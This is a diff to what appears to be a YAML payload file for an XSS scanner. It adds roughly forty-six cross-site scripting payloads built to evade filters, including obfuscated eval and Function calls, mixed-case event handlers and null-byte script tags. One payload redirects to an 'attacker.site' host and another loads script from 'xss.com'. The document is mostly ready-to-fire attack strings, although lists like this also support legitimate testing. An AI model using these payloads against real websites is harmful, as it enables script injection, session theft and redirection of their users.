@@ -17,6 +17,52 @@ payload:
   - '<img src=x onerror=alert(document.domain)>/all'
   - '<ahref="javascript:top[8680439..toString(30)]()">XSS Test</a>'
   - '<ahref="javascript:window[/alert/.source]()">XSS Test</a>'
+  - 'confirm.call(null,1)'
+  - "javascript:setInterval('ale'+'rt(document.domain)')"
+  - "javascript:setInterval('pri'+'nt(document.domain)')"
+  - "javascript:setInterval('fet'+'ch(document.domain)')"
+  - "javascript:setInterval('eva'+'l(document.domain)')"
+  - "javascript:setInterval('con'+'firm(document.domain)')"
+  - "javascript:setInterval('prom'+'pt(document.domain)')"
+  - 'alert.call(%20, "XSS");'
+  - "eval(location.hash.slice(1)) #alert(1)"
+  - "(alert)(1)"
+  - "';alert(1)//"
+  - '"//Onx=""//%01onfocus=prompt(1)>'
+  - "<svg/onload=alert(=RND=)//"
+  - '"%2501onclick=prompt(1)>'
+  - '"Onclick="(prompt(1))'
+  - '"Onx=[] onMouSeoVer=prompt(1)>'
+  - '"onClick="(prompt)(1)'
+  - '"Onclick="([1].map(confirm))'
+  - "'>alert(1)</script><script/1='"
+  - '"//Onx=""//onfocus=prompt(1)>'
+  - '"Onx=() onMouSeoVer=prompt(1)>'
+  - '"OnCliCk="(prompt`1`)'
+  - "[1].find(alert('1'))"
+  - "<img\\nsrc=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=\\nonload=alert(1)>"
+  - "prompt.call(null,1)"
+  - "document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>"
+  - "alert.apply(null, [1])"
+  - "&lt;svg/onload&equals;alert(1)&gt;"
+  - "prompt.call(null%252C1)"
+  - '"%01onClick=prompt(1)>'
+  - '\"autof<x>ocus o<x>nfocus=alert<x>(1)//'
+  - "alert.call(null,1)"
+  - '\"o<x>nmouseover=alert<x>(1)//'
+  - "eval(URL.slice(-8)) #alert(1)"
+  - "*/alert(1)</script><script>/*"
+  - '\"autofocus=alert(1)//'
+  - "top[8680439..toString(30)](1)"
+  - '"><p only=1337 onmouseenter=window.location.href=//attacker.site>'
+  - "<xhzeem attr=\" --- x=\"=='='onmouseover=confirm`xhzeem` style=\"display:block;width:1000px;height:1000px;background:red\"> --- \">"
+  - '"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//'
+  - '"><svg onmouseover="confirm&#0000000040document.domain)'
+  - "<<scr\0ipt/src=http://xss.com/xss.js></script"
+  - '25) <a href=[]" onmouseover=prompt(1)//">XYZ</a'
+  - 'Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();'
+  - '<a href=[]" onmouseover=prompt(1)//">XYZ</a'
+  - "\'-alert(1)//"
 encoder:
   - Base64Flat
   - URL
